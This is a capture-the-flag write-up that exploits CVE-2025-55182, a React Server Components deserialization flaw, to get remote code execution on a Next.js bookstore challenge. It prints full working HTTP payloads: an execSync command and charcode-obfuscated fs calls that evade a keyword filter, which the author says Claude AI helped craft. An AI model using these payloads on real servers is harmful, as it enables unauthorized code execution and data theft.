# Reactivity Book Store - CTF Writeup




From the challenge name "Reactivity Bookstore", we can guess this is something related to React.

![Challenge Interface](https://cdn-images-1.medium.com/max/800/1*QQV98G5zwpqw_FHccC5CZw.png)

When we examine the response headers, we see:

```
x-powered-by: Next.js
```

![Response Headers](https://cdn-images-1.medium.com/max/1200/1*1IHb-7LW0XBrVafxLq9p1w.png)

This confirms the application is running on Next.js framework.

---

## Testing for Vulnerabilities

We tried to see if this was a Next.js middleware vulnerability, but that path didn't work.

![Middleware Testing](https://cdn-images-1.medium.com/max/1200/1*K9di4znRlEK_NH_WIzIomw.png)

---

## Research and Discovery

I found this writeup that helped me solve the challenge:

**Reference:** [React2Shell - Unauthenticated RCE CVE-2025-55182](https://mresecurity.com/blog/react2shell-unauthenticated-rce-cve-2025-55182-full-exploit-walkthrough-p3rf3ctr00t-2025-ctf)

The vulnerability is a React Server Components (RSC) deserialization attack that allows remote code execution.

---

## Exploitation Process

### Step 1: Simple GET Request

First, make a simple GET request to the application:

![GET Request](https://cdn-images-1.medium.com/max/800/1*9dkU8WWj3z6sSVaB-favyw.png)

### Step 2: Change Request Method

Right-click on the request and select "Change request method":

![Change Method](https://cdn-images-1.medium.com/max/800/1*vtyQEUrfqgOUKP63FiAdWQ.png)

### Step 3: Initial Payload

You can copy the payload below into the request pane and submit:

```http
POST / HTTP/1.1
Host: challenge.perfectroot.wiki:36382
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

---

## Bypassing the AI Filter

We discovered there are some filters in place. Normal commands like `cat` don't return results.

After using Claude AI, we were able to pass this filter by using an obfuscated payload:

![Claude AI Help](https://cdn-images-1.medium.com/max/800/1*_F2t2ucj4mDVCoVWioau9g.png)

### Modified Payload to List Root Directory

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var g=global;var p=g[String.fromCharCode(112,114,111,99,101,115,115)];var r=p.mainModule[String.fromCharCode(114,101,113,117,105,114,101)];var f=r(String.fromCharCode(102,115));var d=f.readdirSync('/');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:d.join(',')});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

This payload lists the `/` directory using encoded strings to bypass the filter.

---

## Finding and Reading the Flag

![Directory Listing](https://cdn-images-1.medium.com/max/800/1*YTA9NnS-Ie15aYJvxdG2fg.png)

After listing the directory, we found the flag file. We then read it using a similar obfuscated payload.

![Flag Response](https://cdn-images-1.medium.com/max/800/1*fVfGvMVUJpwmY9Rz4jZluw.png)

The response returned hex-encoded data:

```
7368656c6c6d617465737b246f4d655f7765425f56556c4e33726162314c31744945245f63346e5f63615573655f63483434614f537d
```

---

## Decoding the Flag

After decoding the hex string, we get the final flag:

```
shellmates{$oMe_weB_VUlN3rab1L1tIE$_c4n_caUse_cH44aOS}
```

---

## Full Exploit Code

### Payload 1: List Root Directory

```http
POST / HTTP/1.1
Host: reactivity-book-store.ctf-bsides-algiers-2k25.shellmates.club
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var g=global;var p=g[String.fromCharCode(112,114,111,99,101,115,115)];var r=p.mainModule[String.fromCharCode(114,101,113,117,105,114,101)];var f=r(String.fromCharCode(102,115));var d=f.readdirSync('/');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:d.join(',')});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

### Payload 2: Read Flag File

```http
POST / HTTP/1.1
Host: reactivity-book-store.ctf-bsides-algiers-2k25.shellmates.club
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 820

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var g=global;var p=g[String.fromCharCode(112,114,111,99,101,115,115)];var r=p.mainModule[String.fromCharCode(114,101,113,117,105,114,101)];var f=r(String.fromCharCode(102,115));var content=f.readFileSync('/flag-FILENAME.txt');var hex=content.toString('hex');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:hex});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

---

## Key Techniques

### Obfuscation with String.fromCharCode()

To bypass the AI filter, we encoded sensitive keywords:

- `process` → `String.fromCharCode(112,114,111,99,101,115,115)`
- `require` → `String.fromCharCode(114,101,113,117,105,114,101)`
- `fs` → `String.fromCharCode(102,115)`

### Using fs Instead of child_process

Instead of using `child_process.execSync()` which gets filtered, we used the `fs` module to read files directly.

---

## Summary

1. Identified Next.js from response headers
2. Found CVE-2025-55182 (React Server Components RCE)
3. Used Claude AI to craft obfuscated payloads
4. Bypassed AI filter using `String.fromCharCode()` encoding
5. Listed root directory to find flag file
6. Read flag file and decoded hex output

**Final Flag:** `shellmates{$oMe_weB_VUlN3rab1L1tIE$_c4n_caUse_cH44aOS}`

---

## Tools Used

- Burp Suite
- Claude AI
- Hex Decoder

---

## References

- [React2Shell RCE CVE-2025-55182 Walkthrough](https://mresecurity.com/blog/react2shell-unauthenticated-rce-cve-2025-55182-full-exploit-walkthrough-p3rf3ctr00t-2025-ctf)

---

**Author:** Hatem  
**Event:** BSides Algiers 2025  
**Date:** December 2025